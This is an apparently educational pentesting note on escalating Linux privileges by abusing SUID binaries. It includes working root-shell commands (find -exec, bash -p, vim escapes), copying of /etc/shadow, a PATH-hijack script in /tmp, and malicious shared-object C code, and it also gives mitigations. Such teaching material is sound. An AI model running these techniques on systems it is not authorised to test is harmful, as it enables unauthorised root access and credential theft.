---
tags: [linux, privesc, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.03 SUID Binaries Abuse"
---

# SUID Binaries Abuse

## 1. Executive Summary

The Set-User-ID (SUID) bit is a Linux file permission that allows an executable file to be run with the privileges of the file's owner, rather than the privileges of the user who executes it. 

While SUID is essential for normal system operations (e.g., standard users need to run `/usr/bin/passwd` to change their password, which requires writing to the root-owned `/etc/shadow`), it represents one of the most classic and dangerous privilege escalation vectors. If an attacker can manipulate the execution flow of a SUID binary owned by `root`, they can coerce the binary into executing arbitrary commands or spawning a shell with root privileges.

This document details the underlying mechanics of SUID, identification strategies, common vulnerable binaries, and advanced exploitation techniques including shared object injection and path hijacking.

## 2. Core Mechanics: Real UID vs Effective UID

To exploit SUID, one must understand how the Linux kernel handles process identities via the `execve()` system call.

When a user executes a binary, the resulting process inherits several IDs:
- **Real User ID (RUID):** The ID of the user who initiated the process (e.g., `1000` for user `sanchit`).
- **Effective User ID (EUID):** The ID used by the kernel to determine access permissions for system resources.

Normally, when a program is executed, `EUID == RUID`.
However, if the executable file has the SUID bit set (represented by an `s` in the permission string: `-rwsr-xr-x`), the `execve()` syscall modifies the EUID of the resulting process to match the owner of the file.

If the file is owned by `root` (UID 0), the process runs with `EUID = 0`. The process is now operating with root privileges, even if `RUID = 1000`. 

## 3. Enumerating SUID Binaries

Finding SUID binaries is trivial using the `find` command. The goal is to locate files with the `4000` permission bit set.

```bash
# Search from root directory, specify type file, permissions 4000, redirect errors to /dev/null
find / -type f -perm -04000 -ls 2>/dev/null
```

**Interpreting the output:**
The output will list dozens of files. Many are secure and intended to be SUID (e.g., `sudo`, `passwd`, `chsh`, `su`, `mount`). The attacker is hunting for **anomalous** SUID binaries. These include:
- System binaries not normally given SUID (e.g., `cp`, `find`, `vim`, `bash`).
- Custom, internally developed binaries (e.g., `/opt/company_backup_tool`).

## 4. Exploiting Standard Binaries (GTFOBins)

If a standard system binary has an unintended SUID bit, attackers refer to **GTFOBins**—a curated list of Unix binaries that can be used to bypass local security restrictions.

### 4.1. Exploiting `find`
If `find` is SUID root, it can be abused using its `-exec` parameter, which executes commands on the files it finds.
```bash
# The command executes /bin/sh. Because find is running as EUID=0, the shell drops as root.
find . -exec /bin/sh -p \; -quit
```
*Note: The `-p` flag is critical in modern bash environments to prevent bash from dropping elevated privileges.*

### 4.2. Exploiting Text Editors (`vim`, `nano`)
If an editor like `vim` is SUID root, an attacker can:
1. Edit `/etc/passwd` or `/etc/shadow` directly.
2. Spawn a shell from within vim using the command mode: `:!/bin/sh`

### 4.3. Exploiting `bash` or `cp`
- `bash`: `bash -p` (The `-p` preserves the EUID instead of reverting to the RUID).
- `cp`: `cp /etc/shadow /tmp/shadow.txt` or overwriting `/etc/passwd`.

## 5. Exploiting Custom Binaries

When encountering custom compiled binaries with SUID (e.g., a C program written by a sysadmin), standard GTFOBins won't apply. Attackers must reverse engineer the binary's behavior using tools like `strings`, `strace`, or `ltrace`.

### 5.1. Path Hijacking
If a SUID binary executes another program without using an absolute path (e.g., `system("service apache2 restart");` instead of `system("/usr/sbin/service apache2 restart");`), it is vulnerable to Path Hijacking.

**Exploitation Steps:**
1. Create a malicious script named `service` in the `/tmp` directory.
   ```bash
   echo '/bin/bash -p' > /tmp/service
   chmod +x /tmp/service
   ```
2. Modify the PATH environment variable so `/tmp` is checked first.
   ```bash
   export PATH=/tmp:$PATH
   ```
3. Execute the custom SUID binary. When it calls `service`, the OS looks in `/tmp` first, finds the malicious script, and executes it as root.

### 5.2. Shared Object Injection
When a binary runs, it dynamically loads shared libraries (`.so` files). If a SUID binary attempts to load a library from a directory writable by the attacker (or if the `RPATH` is misconfigured), the attacker can inject a malicious library.

1. Run `strace /usr/local/bin/custom_suid 2>&1 | grep -i -E "open|access|no such file"` to find missing libraries.
2. If it looks for `/tmp/libcalc.so`, create a malicious C library:
   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <sys/types.h>
   #include <unistd.h>

   void _init() {
       setuid(0);
       setgid(0);
       system("/bin/bash -p");
   }
   ```
3. Compile it: `gcc -shared -fPIC -o /tmp/libcalc.so malicious.c`
4. Run the binary.

## 6. SUID Context Switch (ASCII Diagram)

```text
+-------------------------------------------------------------------------+
|                  SUID EXECUTION PRIVILEGE ESCALATION                    |
+-------------------------------------------------------------------------+
|                                                                         |
|   1. USER EXECUTES BINARY                                               |
|      sanchit (UID=1000)                                                 |
|          |                                                              |
|          v                                                              |
|   +------------------------------------+                                |
|   |  FILE SYSTEM                       |                                |
|   |  /usr/bin/find                     |                                |
|   |  Owner: root (UID=0)               |                                |
|   |  Perms: -rwsr-xr-x (SUID Bit Set)  |                                |
|   +------------------------------------+                                |
|          |                                                              |
|          v                                                              |
|   2. KERNEL execve() CALL                                               |
|   +------------------------------------+                                |
|   |  struct cred {                     |                                |
|   |      uid  = 1000 (RUID)            | -> Original caller ID          |
|   |      euid = 0    (EUID)            | -> MODIFIED BY KERNEL DUE TO 's|
|   |  }                                 |                                |
|   +------------------------------------+                                |
|          |                                                              |
|          v                                                              |
|   3. PROCESS EXECUTION                                                  |
|      find . -exec /bin/sh -p \;                                         |
|      (Runs with EUID=0 permissions)                                     |
|          |                                                              |
|          v                                                              |
|   4. SHELL SPAWNED                                                      |
|      # whoami                          |                                |
|      root                              |                                |
+-------------------------------------------------------------------------+
```

## 7. Mitigation Strategies

1. **Principle of Least Privilege:** Remove the SUID bit from any binary that does not strictly require it (`chmod u-s /path/to/binary`).
2. **Mount Options:** Mount file systems intended for user data (like `/tmp`, `/home`, `/var/www`) with the `nosuid` option in `/etc/fstab`. This instructs the kernel to ignore the SUID bit on any file within that filesystem.
3. **Absolute Paths:** Developers must write custom code using absolute paths and securely handle environment variables to prevent Path Hijacking.

## 8. Chaining Opportunities

- **Information Disclosure to SUID Exploit:** Finding credentials in a database that grant SSH access as a standard user, which then allows the attacker to execute a vulnerable SUID binary found via `LinPEAS`.
- **SUID to Kernel Exploit:** A SUID binary might allow an attacker to load a custom kernel module (`insmod`) or interact with a vulnerable device driver, elevating privileges at Ring 0.
- **SUID and Shared Objects:** Exploiting an arbitrary file write vulnerability to overwrite a `.so` file loaded by an existing SUID binary.

## 9. Related Notes
- [[01 - Linux PrivEsc Methodology Overview]]
- [[02 - Enumeration Tools]]
- [[04 - SGID Binaries Abuse]]
- [[05 - Capabilities Abuse]]
- [[06 - Sudo Misconfigurations]]
- [[07 - Writable etc passwd]]
